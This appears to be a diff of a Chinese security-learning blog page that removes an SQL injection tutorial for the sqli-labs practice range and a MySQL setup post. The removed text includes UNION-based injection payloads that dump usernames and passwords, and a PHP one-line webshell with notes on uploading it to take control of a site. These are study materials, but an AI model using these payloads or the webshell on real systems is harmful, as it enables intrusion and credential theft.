-<h2 id="sql的相关知识"><a href="#sql的相关知识" class="headerlink" title="sql的相关知识"></a>sql的相关知识</h2><p>一、什么是sql<br>是一种用于管理关系数据库，并与数据库中的数据进行通讯的计算机语言<br>二、什么是sql注入<br>在我们的应用系统使用sql语句进行管理数据库时，往往采用拼接的方式形成一条完整的数据库语言，而危险的是，在拼接sql语句的时候，<strong>我们可以改变sql语句。从而让数据执行我们想要执行的语句</strong>，这就是我们常说的sql注入<br>三、sql注入的分类<br><img src="https://img-blog.csdnimg.cn/20210211110650990.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">四、数字型与字符型<br>1、数字型判断：<br>当输入的参 x 为整型时，通常 abc.php 中 Sql 语句类型大致如下：<br> <code>select * from &lt;表名&gt; where id = x</code><br>  这种类型可以使用经典的 and 1=1 和 and 1=2 来判断<br>        Url 地址中输入 <a target="_blank" rel="noopener" href="http://xxx/abc.php?id=">http://xxx/abc.php?id=</a> x and 1=1 页面依旧运行正常，继续进行下一步。<br>        Url 地址中继续输入 <a target="_blank" rel="noopener" href="http://xxx/abc.php?id=">http://xxx/abc.php?id=</a> x and 1=2 页面运行错误，则说明此 Sql 注入为数字型注入。<br>2、当输入的参 x 为字符型时，通常 abc.php 中 SQL 语句类型大致如下：<br><code>select * from &lt;表名&gt; where id = &#39;x&#39;</code><br>这种类型我们同样可以使用 and ‘1’=’1 和 and ‘1’=’2来判断：<br>        Url 地址中输入 <a target="_blank" rel="noopener" href="http://xxx/abc.php?id=">http://xxx/abc.php?id=</a> x’ and ‘1’=’1 页面运行正常，继续进行下一步。<br>        Url 地址中继续输入 <a target="_blank" rel="noopener" href="http://xxx/abc.php?id=">http://xxx/abc.php?id=</a> x’ and ‘1’=’2 页面运行错误，则说明此 Sql 注入为字符型注入。<br> <strong>注意：1、字符型会自动加入两个单引号。<br>      2、数字型不会加入两个单引号。<br>     3、被单引号括起来的数据会被当成一个整体。<br>     4、LIMIT m,n 会影响select语句的结果。<br>     5、页面回显发生错误和页面不回显数据是两回事。前者表示sql语句出错了，后者表示sql语句没有错误，但是条件不成立。</strong></p>
-<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>一、mysql相关指令</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查库：select schema_name <span class="keyword">from</span> information_schema.schemata</span><br><span class="line">查表：select table_name <span class="keyword">from</span> information_schema.tables where table_schema=‘security’</span><br><span class="line">查列：select column_name <span class="keyword">from</span> information_schema.columns where table_name=‘users’</span><br><span class="line">查字段：select username,password <span class="keyword">from</span> security.users</span><br></pre></td></tr></table></figure>
-<p>关于mysql的相关知识可查询<a target="_blank" rel="noopener" href="https://editor.csdn.net/md/?articleId=113677723">mysql相关知识</a><br>二、系统函数<br>1、<code>version()</code>–mysql版本<br><img src="https://img-blog.csdnimg.cn/20210210183931359.png" alt="在这里插入图片描述"><br>2、<code>user()</code>–数据库用户名</p>
-<p><img src="https://img-blog.csdnimg.cn/20210210205741274.png" alt="在这里插入图片描述"><br>3、<code>database()</code>–数据库名<br><img src="https://img-blog.csdnimg.cn/20210211211456802.png" alt="在这里插入图片描述"><br>4、<code>@@datadir</code>–数据库路径<br><img src="https://img-blog.csdnimg.cn/20210211211814439.png" alt="在这里插入图片描述"><br>5、<code>concat()</code>–连接函数</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">concat(str1,str2,...)</span><br><span class="line">--没有分隔符地连接字符串</span><br><span class="line">--返回结果为连接参数产生的字符串</span><br><span class="line">--如有任何一个参数为NULL, 则返回值为 NULL</span><br><span class="line">--可以有一个或多个参数</span><br></pre></td></tr></table></figure>
-<p>6、<code>concat_ws()</code></p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">concat_ws(separator,str1,str2,...)</span><br><span class="line">--含有分隔符地连接字符串, 分隔符的位置会放在要连接的两个字符串之间</span><br><span class="line">--Separator为字符之间的分隔符, 可以是一个字符串, 也可以是其它参数</span><br><span class="line">--如果分隔符为 NULL, 则结果为 NULL</span><br><span class="line">--函数会忽略任何分隔符参数后的 NULL 值</span><br></pre></td></tr></table></figure>
-<h2 id="sql-labs-master靶场"><a href="#sql-labs-master靶场" class="headerlink" title="sql-labs master靶场"></a>sql-labs master靶场</h2><p>一、注入流程：<br><img src="https://img-blog.csdnimg.cn/20210214100858566.png" alt="在这里插入图片描述"><br><strong>我们的数据库存储的数据按照上图的形式，一个数据库当中有很多的数据表，数据表当中有很多的列，每一列当中存储着数据。我们注入的过程就是先拿到数据库名，在获取到当前数据库名下的数据表，再获取当前数据表下的列，最后获取数据</strong><br>二、靶场部分解题步骤：<br>1、判断有无注入<br>2、判断是什么注入<br>3、①less1 id=1’；less2 id=1；less3 id=1’)；less4 id=1”)<br>②查看有多少列：order by 3–+<br>③查看哪些数据可以回显：union select 1,2,3–+<br>④查看当前数据库：union select 1,2,database()–+<br>⑤查看数据库security：union select 1,2,group_concat(schema_name)from information_schema.schemata–+<br>⑥查表：union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=‘security’–+<br>⑦查询列信息：union select 1,2,group_concat(column_name)from information_schema.columns where table_schema=‘security’–+<br>⑧查询账号和密码：union select 1,2,group_concat(concat_ws(’~’,username,password)) from security.users–+<br>4、一句话木马（webshell)<br>①举例：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @<span class="built_in">eval</span>($_POST[<span class="string">&#x27;attack&#x27;</span>]) ?&gt;</span><br></pre></td></tr></table></figure>
-<p>利用文件上传漏洞，往目标网站中上传一句话木马，然后你就可以在本地通过中国菜刀chopper.exe即可获取和控制整个网站目录。@表示后面即使执行错误，也不报错。eval（）函数表示括号内的语句字符串什么的全都当做代码执行。$_POST[‘attack’]表示从页面中获得attack这个参数值<br>②一句话木马需要蚁剑，可查看博客<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36235492/article/details/85713821?utm_source=app&app_version=4.5.2">中国蚁剑安装教程</a><br>③特点：一句话木马短小精悍，而且功能强大，隐蔽性非常好，在入侵中始终扮演着强大的作用。<br>三、sql-labs 靶场注入分类<br>1、基于从服务器接收到的响应<br>&lt;1&gt;基于错误的 SQL 注入<br>原理：注入攻击的原理在于，程序命令和用户数据之前没有进行校验，使得攻击者有机会将程序命令当做用户输入的数据交给web程序，为所欲为。<br><strong>也就是说:接受相关参数未经处理直接带入数据库查询操作</strong><br>&lt;2&gt;联合查询的类型<br>UNION运算符可以bai将两个或两个以上上SELECT语句的查询结果集合合并成一个结果集合显示，即执行联合查询<br>&lt;3&gt;堆查询注射(堆叠注入)<br>原理：在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。<br><strong>也就是说：将语句堆叠在一起进行查询</strong><br>&lt;4&gt;SQL 盲注<br>1、原理：指的是在不知道数据库返回值的情况下对数据中的内容进行猜测，实施SQL注入，是一种猜测性质的注入<br>2、分类<br>①基于布尔SQL盲注<br>②基于时间的 SQL 盲注<br>③基于报错的 SQL 盲注<br>&lt;5&gt;基于如何处理输入的 SQL 查询（数据类型）<br>①基于字符串<br>②数字或整数为基础的</p>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2021/05/19/mysql%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/">
-                MYSQL的相关知识
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2021-05-19</span>
-            
-            
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <h2 id="MYSQL的相关知识"><a href="#MYSQL的相关知识" class="headerlink" title="MYSQL的相关知识"></a>MYSQL的相关知识</h2><p><img src="https://img-blog.csdnimg.cn/20210204155759135.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">一、定义：MySQL是一种开放源代码的关系型数据库管理系统（RDBMS），使用最常用的数据库管理语言–结构化查询语言（SQL）进行数据库管理。（关于<a target="_blank" rel="noopener" href="https://blog.csdn.net/jianghao233/article/details/81177950?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522161248878816780269824151%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&request_id=161248878816780269824151&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-81177950.first_rank_v2_pc_rank_v29_10&utm_term=%25E6%2595%25B0%25E6%258D%25AE%25E5%25BA%2593%25E7%25AE%25A1%25E7%2590%2586%25E7%25B3%25BB%25E7%25BB%259F">数据库管理系统</a>）<br>二、用处：mysql是用来制作数据库的（数据库的概念：数据库是“按照数据结构来组织、存储和管理数据的仓库”，是一个长期存储在计算机内的、有组织的、可共享的、统一管理的大量数据的集合，<strong>即按照某些特征存储数据的仓库</strong>）。<br>三、mysql的下载及使用<br>1、这里推荐使用phpstudy，在官网下载（<a target="_blank" rel="noopener" href="https://www.xp.cn/%EF%BC%89%EF%BC%8C%E8%A6%81%E6%B3%A8%E6%84%8F%E8%B7%AF%E5%BE%84%E4%B8%AD%E4%B8%8D%E8%83%BD%E5%87%BA%E7%8E%B0%E6%B1%89%E5%AD%97%E4%BB%A5%E5%8F%8A%E5%A6%82%E6%9E%9C%E4%B9%8B%E5%89%8D%E4%B8%8B%E8%BD%BD%E8%BF%87phpstudy%E5%88%99%E9%9C%80%E8%A6%81%E6%B8%85%E9%99%A4%E5%B9%B2%E5%87%80%EF%BC%9B">https://www.xp.cn/），要注意路径中不能出现汉字以及如果之前下载过phpstudy则需要清除干净；</a><br>2、下载后安装打开<img src="https://img-blog.csdnimg.cn/20210205100326338.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">3、mysql命令行的打开<br>&lt;1&gt;在首页中打开Nginx;<br>&lt;2&gt;打开cdn<img src="https://img-blog.csdnimg.cn/20210205101150516.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">&lt;3&gt;在cmd内输入</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p</span><br></pre></td></tr></table></figure>
-<p>然后输入密码即可使用<br><img src="https://img-blog.csdnimg.cn/20210205102024474.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里的默认密码为root，不建议大家更改密码，因为如果更改密码，搭建靶场时会十分麻烦。</p>
-
-        </div>
-    
-
-</div>
-            
         </section>
     </div>
 </div>
@@ -514,19 +562,19 @@
         <ul>
             
             <li>
+                <a class="footer-post" href="/2021/08/08/PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/">PHP魔术方法</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2021/08/08/PHP%E4%B8%8D%E6%AD%BB%E9%A9%AC/">PHP不死马</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2021/08/08/buuctf_php/">buuctf_php</a>
+            </li>
+            
+            <li>
                 <a class="footer-post" href="/2021/08/01/%E8%AE%A1%E7%BD%91%E7%BD%91%E7%BB%9C%E7%AF%87/">计网网络篇</a>
-            </li>
-            
-            <li>
-                <a class="footer-post" href="/2021/07/25/buuctf(%E4%BA%8C)/">buuctf（二）</a>
-            </li>
-            
-            <li>
-                <a class="footer-post" href="/2021/07/25/beef/">beef</a>
-            </li>
-            
-            <li>
-                <a class="footer-post" href="/2021/07/18/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/">图片隐写</a>
             </li>
             
         </ul>
